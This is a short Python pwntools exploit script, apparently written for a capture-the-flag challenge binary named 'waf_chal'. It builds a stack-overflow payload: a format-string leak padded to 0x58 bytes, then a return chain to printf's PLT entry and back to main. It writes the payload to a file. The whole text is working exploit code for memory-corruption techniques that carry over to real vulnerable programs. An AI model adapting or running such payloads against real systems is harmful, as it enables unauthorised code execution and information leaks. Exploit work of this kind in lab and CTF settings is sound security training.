from pwn import *
context.arch='amd64'
e=ELF("/work/waf_chal/waf/chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
fmt=b"%9$p"   # short fmt
body=(b"exit"+fmt).ljust(0x58,b"A")
assert b"\x00" not in body
pay=body+p64(PRINTF)+p64(MAIN)   # try to put MAIN after printf
open("/work/waf_payload.bin","wb").write(pay)
print("len",len(pay), "first null at", pay.index(b"\x00"))
